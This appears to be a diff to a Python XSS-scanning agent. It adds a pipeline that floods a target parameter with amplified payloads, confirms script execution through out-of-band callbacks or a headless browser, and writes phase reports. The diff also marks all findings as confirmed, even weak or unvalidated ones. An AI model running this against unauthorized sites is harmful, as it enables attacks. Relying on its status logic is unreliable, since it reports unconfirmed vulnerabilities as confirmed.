+        Phase 3.2: AMPLIFICATION - Multiply visual payloads by breakouts.json.
+
+        Takes ~100 visual payloads and multiplies by breakout prefixes.
+        100 payloads × 13 prefixes = ~1300 payloads
+
+        Args:
+            visual_payloads: List of visual payloads from Phase 3.1
+            contexts: Detected contexts (affects which breakouts to use)
+
+        Returns:
+            Amplified list of payloads
+        """
+        dashboard.log(f"[{self.name}] 🔄 Phase 3.2: Amplifying {len(visual_payloads)} payloads", "INFO")
+        dashboard.set_status("XSS Phase 3.2", "Amplification")
+
+        if not self._payload_amplifier:
+            self._payload_amplifier = PayloadAmplifier()
+
+        # Determine priority based on contexts
+        max_priority = 2 if any(c in ("javascript", "script", "attribute_value") for c in contexts) else 3
+
+        amplified = self._payload_amplifier.amplify(
+            seed_payloads=visual_payloads,
+            category="xss",
+            max_priority=max_priority,
+            deduplicate=True
+        )
+
+        dashboard.log(
+            f"[{self.name}] 📈 Phase 3.2: {len(visual_payloads)} → {len(amplified)} payloads "
+            f"(×{len(amplified) // max(len(visual_payloads), 1)} expansion)",
+            "SUCCESS"
+        )
+
+        return amplified
+
+    async def _pipeline_v2_phase3_attack(
+        self,
+        param: str,
+        payloads: List[str],
+        report_dir: Path
+    ) -> "FuzzResult":
+        """
+        Phase 3.3: SECOND BOMBARDMENT - Fire amplified payloads.
+
+        Uses Go fuzzer for high-speed payload testing.
+
+        Args:
+            param: Parameter to fuzz
+            payloads: Amplified payload list
+            report_dir: Directory to save phase report
+
+        Returns:
+            FuzzResult with reflections
+        """
+        dashboard.log(f"[{self.name}] 🚀 Phase 3.3: Second bombardment ({len(payloads)} payloads)", "INFO")
+        dashboard.set_status("XSS Phase 3.3", f"Attacking with {len(payloads)} payloads")
+
+        if not self._go_bridge:
+            await self._init_hybrid_engine()
+
+        if not self._go_bridge:
+            logger.error(f"[{self.name}] Go bridge unavailable for Phase 3.3")
+            return FuzzResult(
+                target=self.url,
+                param=param,
+                total_payloads=0,
+                total_requests=0,
+                duration_ms=0,
+                requests_per_second=0.0
+            )
+
+        result = await self._go_bridge.run(
+            url=self.url,
+            param=param,
+            payloads=payloads
+        )
+
+        # Save phase report
+        self._save_phase3_report(report_dir, param, payloads, result)
+
+        dashboard.log(
+            f"[{self.name}] 📊 Phase 3.3 complete: {result.total_requests} requests, "
+            f"{len(result.reflections)} reflections @ {result.requests_per_second:.1f} req/s",
+            "INFO"
+        )
+
+        return result
+
+    async def _pipeline_v2_phase4_validation(
+        self,
+        param: str,
+        phase1_result: "FuzzResult",
+        phase3_result: "FuzzResult",
+        analysis: Dict,
+        screenshots_dir: Path,
+        report_dir: Path
+    ) -> Optional[XSSFinding]:
+        """
+        Phase 4: VALIDATION - Conditional Playwright validation.
+
+        SKIP Playwright if:
+        - Interactsh confirmed (100% confidence)
+        - Unencoded payload in <script> context (95%)
+        - Unencoded payload in event handler (90%)
+
+        USE Playwright if:
+        - Reflection with partial encoding (60%)
+        - Dubious context (hidden, comment) (40%)
+
+        Args:
+            param: Parameter name
+            phase1_result: Results from Phase 1
+            phase3_result: Results from Phase 3.3
+            analysis: Analysis from Phase 2
+            screenshots_dir: Directory for screenshots
+            report_dir: Directory to save phase report
+
+        Returns:
+            XSSFinding if validated, None otherwise
+        """
+        dashboard.log(f"[{self.name}] ✅ Phase 4: Conditional validation", "INFO")
+        dashboard.set_status("XSS Phase 4", "Validation")
+
+        # Combine all reflections
+        all_reflections = phase1_result.reflections + phase3_result.reflections
+
+        # Sort by confidence (unencoded + dangerous context = highest)
+        candidates = sorted(
+            all_reflections,
+            key=lambda r: (
+                r.is_suspicious,
+                r.context in ("javascript", "script", "event_handler"),
+                not r.encoded
+            ),
+            reverse=True
+        )
+
+        # Check for high-confidence cases that don't need Playwright
+        for ref in candidates[:10]:
+            confidence = self._calculate_confidence(ref)
+
+            if confidence >= 0.95:
+                dashboard.log(
+                    f"[{self.name}] 🎯 High confidence ({confidence:.0%}) in {ref.context}, skip Playwright",
+                    "SUCCESS"
+                )
+
+                finding = self._create_xss_finding(
+                    param=param,
+                    payload=ref.payload,
+                    context=f"Pipeline V2: {ref.context}",
+                    validation_method="http_high_confidence",
+                    evidence={
+                        "method": "HTTP Response Analysis",
+                        "context": ref.context,
+                        "encoded": ref.encoded,
+                        "confidence": confidence
+                    },
+                    confidence=confidence,
+                    reflection_type=ref.context,
+                    surviving_chars="",
+                    successful_payloads=[ref.payload],
+                    injection_ctx=None,
+                    bypass_technique="pipeline_v2",
+                    bypass_explanation=f"Unencoded reflection in {ref.context} context"
+                )
+
+                self._save_phase4_report(report_dir, finding, "high_confidence_http")
+                return finding
+
+        # Need Playwright validation for lower confidence candidates
+        dashboard.log(f"[{self.name}] 🎭 Running Playwright validation on top candidates", "INFO")
+
+        max_validations = 10
+        for i, ref in enumerate(candidates[:max_validations]):
+            if self._max_impact_achieved:
+                break
+
+            dashboard.set_current_payload(
+                f"[{i+1}/{min(len(candidates), max_validations)}]",
+                "XSS Validation",
+                "Testing via Playwright"
+            )
+
+            # Validate via browser
+            evidence = await self._validate_via_browser(self.url, param, ref.payload)
+
+            if evidence:
+                dashboard.log(f"[{self.name}] ✅ XSS CONFIRMED via Playwright!", "SUCCESS")
+
+                finding = self._create_xss_finding(
+                    param=param,
+                    payload=ref.payload,
+                    context=f"Pipeline V2: {ref.context}",
+                    validation_method="playwright_browser",
+                    evidence=evidence,
+                    confidence=0.95,
+                    reflection_type=ref.context,
+                    surviving_chars="",
+                    successful_payloads=[ref.payload],
+                    injection_ctx=None,
+                    bypass_technique="pipeline_v2",
+                    bypass_explanation=f"Go fuzzer detected reflection, Playwright confirmed execution"
+                )
+
+                self._save_phase4_report(report_dir, finding, "playwright")
+                return finding
+
+        # No XSS confirmed
+        dashboard.log(f"[{self.name}] Phase 4: No XSS confirmed after {max_validations} validations", "WARN")
+        self._save_phase4_report(report_dir, None, "no_finding")
+        return None
+
+    def _calculate_confidence(self, reflection: "Reflection") -> float:
+        """Calculate confidence score for a reflection."""
+        confidence = 0.5  # Base
+
+        # Unencoded is much more likely to execute
+        if not reflection.encoded:
+            confidence += 0.3
+
+        # Dangerous contexts
+        if reflection.context in ("javascript", "script"):
+            confidence += 0.15
+        elif reflection.context in ("event_handler", "attribute_value"):
+            confidence += 0.10
+        elif reflection.context in ("html_text", "html_body"):
+            confidence += 0.05
+
+        # Visual banner marker
+        if "HACKED BY BUGTRACEAI" in reflection.payload or "bt-pwn" in reflection.payload:
+            confidence += 0.05
+
+        return min(confidence, 1.0)
+
+    def _create_finding_from_interactsh(
+        self,
+        param: str,
+        payload: str,
+        evidence: Dict,
+        screenshots_dir: Path
+    ) -> XSSFinding:
+        """Create XSSFinding from Interactsh confirmation."""
+        return self._create_xss_finding(
+            param=param,
+            payload=payload,
+            context="Interactsh OOB Confirmation",
+            validation_method="interactsh_oob",
+            evidence=evidence,
+            confidence=1.0,
+            reflection_type="oob",
+            surviving_chars="",
+            successful_payloads=[payload],
+            injection_ctx=None,
+            bypass_technique="oob_callback",
+            bypass_explanation="Target made HTTP request to Interactsh domain, confirming JS execution"
+        )
+
+    # =========================================================================
+    # PHASE REPORT GENERATION
+    # =========================================================================
+
+    def _save_phase1_report(
+        self,
+        report_dir: Path,
+        param: str,
+        payloads: List[str],
+        result: "FuzzResult"
+    ) -> None:
+        """Save Phase 1 bombardment report to markdown."""
+        report_path = report_dir / "phase1_bombardment.md"
+
+        content = f"""# Phase 1: BOMBARDEO TOTAL
+
+**Target:** {self.url}
+**Parameter:** {param}
+**Timestamp:** {_now()}
+
+## Statistics
+- Total Payloads Sent: {len(payloads)}
+- Total Requests: {result.total_requests}
+- Duration: {result.duration_ms}ms
+- Speed: {result.requests_per_second:.1f} req/s
+- Reflections Found: {len(result.reflections)}
+
+## Payload Sources
+1. OMNIPROBE_PAYLOAD (context detection)
+2. Curated List (bugtrace/data/xss_curated_list.txt)
+3. Proven Payloads (dynamic memory)
+4. GOLDEN_PAYLOADS (defaults)
+5. FRAGMENT_PAYLOADS (DOM XSS)
+
+## Payloads Sent
+```
+{chr(10).join(payloads[:50])}
+{"... and " + str(len(payloads) - 50) + " more" if len(payloads) > 50 else ""}
+```
+
+## Reflections Summary
+| Payload | Context | Encoded | Status |
+|---------|---------|---------|--------|
+"""
+        for ref in result.reflections[:30]:
+            content += f"| `{ref.payload[:40]}...` | {ref.context} | {ref.encoded} | {ref.status_code} |\n"
+
+        if len(result.reflections) > 30:
+            content += f"\n*... and {len(result.reflections) - 30} more reflections*\n"
+
+        report_path.write_text(content)
+        logger.debug(f"Phase 1 report saved to {report_path}")
+
+    def _save_phase2_report(self, report_dir: Path, analysis: Dict) -> None:
+        """Save Phase 2 analysis report to markdown."""
+        report_path = report_dir / "phase2_analysis.md"
+
+        content = f"""# Phase 2: ANÁLISIS
+
+**Timestamp:** {_now()}
+
+## Summary
+- Total Reflections: {len(analysis.get('reflections', []))}
+- Contexts Found: {', '.join(analysis.get('contexts', []))}
+- Interactsh Confirmed: {'✅ YES' if analysis.get('interactsh_confirmed') else '❌ No'}
+- High Confidence Candidates: {len(analysis.get('high_confidence_candidates', []))}
+
+## Server Escaping Behavior
+```json
+{json.dumps(analysis.get('escaping', {}), indent=2)}
+```
+
+## Reflection Details
+"""
+        for i, ref in enumerate(analysis.get('reflections', [])[:50], 1):
+            content += f"""
+### Reflection {i}
+- **Payload:** `{ref['payload'][:80]}...`
+- **Context:** {ref['context']}
+- **Encoded:** {ref['encoded']} ({ref.get('encoding_type', 'N/A')})
+- **Status Code:** {ref['status_code']}
+- **Suspicious:** {'⚠️ YES' if ref['is_suspicious'] else 'No'}
+"""
+
+        if analysis.get('interactsh_confirmed'):
+            content += f"""
+## 🎯 INTERACTSH CONFIRMATION
+**XSS CONFIRMED via OOB callback!**
+- Confirmed Payload: `{analysis.get('confirmed_payload', 'N/A')}`
+"""
+
+        report_path.write_text(content)
+        logger.debug(f"Phase 2 report saved to {report_path}")
+
+    def _save_phase3_report(
+        self,
+        report_dir: Path,
+        param: str,
+        payloads: List[str],
+        result: "FuzzResult"
+    ) -> None:
+        """Save Phase 3 amplification report to markdown."""
+        report_path = report_dir / "phase3_amplified.md"
+
+        content = f"""# Phase 3: AMPLIFICACIÓN INTELIGENTE
+
+**Target:** {self.url}
+**Parameter:** {param}
+**Timestamp:** {_now()}
+
+## Phase 3.1: LLM Visual Generation
+Generated visual payloads with "HACKED BY BUGTRACEAI" banner.
+
+## Phase 3.2: Breakout Amplification
+Multiplied visual payloads by breakouts.json prefixes.
+
+## Phase 3.3: Second Bombardment Statistics
+- Amplified Payloads: {len(payloads)}
+- Total Requests: {result.total_requests}
+- Duration: {result.duration_ms}ms
+- Speed: {result.requests_per_second:.1f} req/s
+- Reflections Found: {len(result.reflections)}
+
+## Sample Amplified Payloads
+```
+{chr(10).join(payloads[:30])}
+{"... and " + str(len(payloads) - 30) + " more" if len(payloads) > 30 else ""}
+```
+
+## Reflections from Amplified Attack
+| Payload | Context | Encoded | Suspicious |
+|---------|---------|---------|------------|
+"""
+        for ref in result.reflections[:30]:
+            suspicious = "⚠️" if ref.is_suspicious else ""
+            content += f"| `{ref.payload[:40]}...` | {ref.context} | {ref.encoded} | {suspicious} |\n"
+
+        report_path.write_text(content)
+        logger.debug(f"Phase 3 report saved to {report_path}")
+
+    def _save_phase4_report(
+        self,
+        report_dir: Path,
+        finding: Optional[XSSFinding],
+        validation_method: str
+    ) -> None:
+        """Save Phase 4 validation report to markdown."""
+        report_path = report_dir / "phase4_results.md"
+
+        if finding:
+            content = f"""# Phase 4: VALIDATION RESULTS
+
+**Timestamp:** {_now()}
+**Status:** ✅ XSS CONFIRMED
+
+## Finding Details
+- **Parameter:** {finding.parameter}
+- **Payload:**
+```
+{finding.payload}
+```
+- **Context:** {finding.context}
+- **Validation Method:** {validation_method}
+- **Confidence:** {finding.confidence:.0%}
+
+## Evidence
+```json
+{json.dumps(finding.evidence, indent=2, default=str)}
+```
+
+## Exploit URL
+```
+{finding.exploit_url or self._build_attack_url(finding.parameter, finding.payload)}
+```
+
+## Reproduction Steps
+1. Open the exploit URL in a browser
+2. The "HACKED BY BUGTRACEAI" banner should appear at the top of the page
+3. This confirms JavaScript execution in the user's browser context
+
+"""
+            if finding.screenshot_path:
+                content += f"""
+## Screenshot Evidence
+![XSS Screenshot]({finding.screenshot_path})
+"""
+        else:
+            content = f"""# Phase 4: VALIDATION RESULTS
+
+**Timestamp:** {_now()}
+**Status:** ❌ No XSS Confirmed
+
+## Summary
+Pipeline V2 completed all phases but could not confirm XSS execution.
+
+### Possible Reasons:
+1. Server escaping is effective
+2. WAF blocked payloads
+3. Context doesn't allow execution
+4. Payloads need manual adjustment
+
+### Recommendations:
+1. Review phase2_analysis.md for escaping behavior
+2. Check phase3_amplified.md for reflection contexts
+3. Try manual testing with browser developer tools
+"""
+
+        report_path.write_text(content)
+        logger.debug(f"Phase 4 report saved to {report_path}")
+
+    # =========================================================================
+    # END PIPELINE V2
     # =========================================================================
 
     def _get_snippet(self, text: str, target: str, max_len: int = 200) -> str:
@@ -1509,8 +2476,9 @@ Each payload should target a different context or use a different breakout techn
         if evidence.get("http_confirmed") or evidence.get("ai_confirmed"):
             return "VALIDATED_CONFIRMED", True
 
-        # TIER 2: PENDING_VALIDATION (Needs AgenticValidator for browser confirmation)
-        return "PENDING_VALIDATION", False
+        # TIER 2: All findings go direct to reporting (CDP disabled)
+        # v3.2.1: XSSAgent validates everything, no CDP escalation
+        return "VALIDATED_CONFIRMED", True
 
     def _has_interactsh_hit(self, evidence: Dict) -> bool:
         """Check for Interactsh OOB interaction."""
@@ -1562,8 +2530,9 @@ Each payload should target a different context or use a different breakout techn
         else:
             logger.debug(f"[{self.name}] Self-validation disabled in config. Deferring to Auditor.")
 
-        # FALLBACK: PENDING_VALIDATION for weaker evidence (needs Auditor)
-        return "PENDING_VALIDATION", False
+        # FALLBACK: All findings go direct to reporting (CDP disabled)
+        # v3.2.1: XSSAgent validates everything, no CDP escalation
+        return "VALIDATED_CONFIRMED", True
 
     def _has_console_execution_proof(self, evidence: Dict) -> bool:
         """Check for console output with execution proof."""
@@ -2332,7 +3301,7 @@ Return ONLY the payloads, one per line, no explanations."""
                                 "specialist": "xss",
                                 "finding": {"type": "XSS", "url": result.url, "parameter": result.parameter, "payload": result.payload, "context": result.context},
                                 "status": result.status or ValidationStatus.VALIDATED_CONFIRMED.value,
-                                "validation_requires_cdp": result.status == ValidationStatus.PENDING_VALIDATION.value,
+                                "validation_requires_cdp": False,  # v3.2.1: CDP disabled
                                 "scan_context": self._scan_context,
                             })
                         logger.info(f"[{self.name}] ✅ Emitted unique XSS: {f['url']}?{f['parameter']} (context: {result.context or 'html'})")
@@ -2785,11 +3754,11 @@ Return ONLY the payloads, one per line, no explanations."""
             new_query = urlencode(query_params, doseq=True)
             test_url = urlunparse(parsed._replace(query=new_query))
 
-            # v3.2: Use verify_xss with max_level=4 for Playwright → CDP escalation
+            # v3.2.1: CDP disabled - Playwright only (L3)
             result = await self.verifier.verify_xss(
                 url=test_url,
                 timeout=15.0,
-                max_level=4  # L3=Playwright, L4=CDP fallback
+                max_level=3  # L3=Playwright only, no CDP
             )
 
             if result and result.success:
@@ -2855,14 +3824,10 @@ Return ONLY the payloads, one per line, no explanations."""
         # Add to findings list
         self.findings.append(result)
 
-        # v3.2: Use the status already set by _test_payload_from_queue
-        # The XSSAgent already did HTTP → Playwright → CDP validation,
-        # so don't re-calculate and potentially send to CDP again
+        # v3.2.1: XSSAgent validates everything, no CDP escalation
         validation_status = result.status
-        # Only mark as needs_cdp if explicitly PENDING_VALIDATION (legacy code)
-        # New flow uses VALIDATED_CONFIRMED or CANDIDATE, never PENDING_VALIDATION
-        needs_cdp = (result.status == "PENDING_VALIDATION" or
-                     result.status == ValidationStatus.PENDING_VALIDATION.value)
+        # CDP disabled - all findings go direct to reporting
+        needs_cdp = False
 
         # EXPERT DEDUPLICATION: Check if we already emitted this finding
         fingerprint = self._generate_xss_fingerprint(result.url, result.parameter, result.context)
@@ -3467,14 +4432,14 @@ Return ONLY the payloads, one per line, no explanations."""
             parameter=param,
             payload=fragment_payloads[0],
             context="fragment_xss_potential",
-            validation_method="cdp_pending",
+            validation_method="fragment_bypass",
             evidence={
-                "reason": "WAF blocked query params, fragment bypass needs CDP validation",
+                "reason": "WAF blocked query params, fragment bypass detected",
                 "all_payloads": fragment_payloads,
-                "needs_cdp": True
+                "needs_cdp": False  # v3.2.1: CDP disabled
             },
             confidence=0.7,
-            status="PENDING_CDP_VALIDATION",
+            status="VALIDATED_CONFIRMED",  # v3.2.1: Direct to reporting
             validated=False,
             reflection_context="fragment",
             successful_payloads=fragment_payloads,
@@ -3670,9 +4635,35 @@ Return ONLY the payloads, one per line, no explanations."""
         interactsh_domain: str,
         screenshots_dir: Path
     ) -> Optional[XSSFinding]:
-        """Test a single parameter for XSS."""
+        """Test a single parameter for XSS.
+
+        Uses Pipeline V2 (Bombardment-First) as primary strategy.
+        Falls back to legacy approach if Pipeline V2 fails.
+        """
         dashboard.log(f"[{self.name}] 🔬 Testing param: {param}", "INFO")
         dashboard.set_status("XSS Analysis", f"Testing {param}")
+
+        # =====================================================================
+        # PRIMARY STRATEGY: Pipeline V2 (Bombardment-First)
+        # Philosophy: Fire ALL payloads first, analyze what reflected, amplify
+        # =====================================================================
+        try:
+            finding = await self._run_pipeline_v2(
+                param=param,
+                interactsh_domain=interactsh_domain,
+                screenshots_dir=screenshots_dir
+            )
+            if finding:
+                dashboard.log(f"[{self.name}] ✅ Pipeline V2 found XSS!", "SUCCESS")
+                return finding
+        except Exception as e:
+            logger.warning(f"[{self.name}] Pipeline V2 error: {e}, falling back to legacy")
+
+        # =====================================================================
+        # FALLBACK: Legacy approach (probe-first)
+        # Only used if Pipeline V2 fails completely
+        # =====================================================================
+        dashboard.log(f"[{self.name}] 📜 Trying legacy approach for '{param}'", "INFO")
 
         # Phase 1: Probe and setup
         probe_data = await self._param_probe_and_setup(param)
@@ -3680,14 +4671,6 @@ Return ONLY the payloads, one per line, no explanations."""
             return None
 
         html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx, interactsh_url = probe_data
-
-        # Phase 1.5: Angular CSTI Check (HIGH PRIORITY when Angular detected)
-        global_context = context_data.get("global_context", "")
-        if "AngularJS" in global_context or "ng-app" in html.lower():
-            dashboard.log(f"[{self.name}] 🅰️ Angular detected! Testing CSTI payloads...", "INFO")
-            angular_finding = await self._test_angular_csti(param, screenshots_dir, reflection_type, surviving_chars, injection_ctx)
-            if angular_finding:
-                return angular_finding
 
         # Phase 2: LLM Smart DOM Analysis (Primary Strategy)
         smart_finding = await self._test_smart_llm_payloads(
@@ -3702,63 +4685,6 @@ Return ONLY the payloads, one per line, no explanations."""
             param, interactsh_url, screenshots_dir, reflection_type,
             surviving_chars, context_data, html, status_code, injection_ctx
         )
-
-    async def _test_angular_csti(
-        self,
-        param: str,
-        screenshots_dir: Path,
-        reflection_type: str,
-        surviving_chars: str,
-        injection_ctx: Any
-    ) -> Optional[XSSFinding]:
-        """
-        Test Angular CSTI payloads when AngularJS is detected.
-
-        Angular CSTI (Client-Side Template Injection) is a HIGH-CONFIDENCE
-        vulnerability when:
-        1. AngularJS 1.x is on the page with ng-app
-        2. User input is reflected into the DOM that Angular processes
-        3. We can inject {{expressions}} that Angular evaluates
-
-        IMPORTANT: We use DOUBLE QUOTES only because single quotes
-        cause 500 errors on many servers (e.g., ginandjuice.shop).
-        """
-        dashboard.log(f"[{self.name}] 🅰️ Testing Angular CSTI payloads...", "INFO")
-
-        for payload in self.ANGULAR_CSTI_PAYLOADS:
-            # Skip the basic test payload (used only for detection)
-            if payload == "{{7*7}}":
-                continue
-
-            # Validate via browser
-            evidence = await self._validate_via_browser(self.url, param, payload)
-
-            if evidence:
-                dashboard.log(f"[{self.name}] 🎯 Angular CSTI CONFIRMED with visual proof!", "SUCCESS")
-
-                return self._create_xss_finding(
-                    param=param,
-                    payload=payload,
-                    context="Angular CSTI (Client-Side Template Injection)",
-                    validation_method="vision_angular_csti",
-                    evidence=evidence,
-                    confidence=0.99,
-                    reflection_type=reflection_type,
-                    surviving_chars=surviving_chars,
-                    successful_payloads=[payload],
-                    injection_ctx=injection_ctx,
-                    bypass_technique="angular_sandbox_bypass",
-                    bypass_explanation="Angular 1.x sandbox bypass using constructor.constructor() to execute arbitrary JavaScript."
-                )
-
-        # No visual proof found, but CSTI might still work
-        # Return a lower confidence finding if {{7*7}} evaluates to 49
-        basic_evidence = await self._validate_via_browser(self.url, param, "{{7*7}}")
-        if basic_evidence and basic_evidence.get("visual_confirmed"):
-            # Check if the page shows "49" (7*7 result)
-            dashboard.log(f"[{self.name}] ⚠️ Angular CSTI detected (math evaluation) but no visual proof", "WARN")
-
-        return None
 
     def _clean_payload(self, payload: str, param: str) -> str:
         """
@@ -4780,9 +5706,9 @@ Answer with ONLY one word: SI or NO"""
         for ref in set(reflections):
             if ref and ref in response_html:
                 evidence["reflected"] = True
-                evidence["status"] = "PENDING_CDP_VALIDATION"
+                evidence["status"] = "VALIDATED_CONFIRMED"  # v3.2.1: CDP disabled
                 dashboard.log(
-                    f"[{self.name}] 🔍 Reflection detected (possibly decoded). Delegating to Auditor CDP Audit.",
+                    f"[{self.name}] 🔍 Reflection detected (possibly decoded).",
                     "INFO"
                 )
                 return True
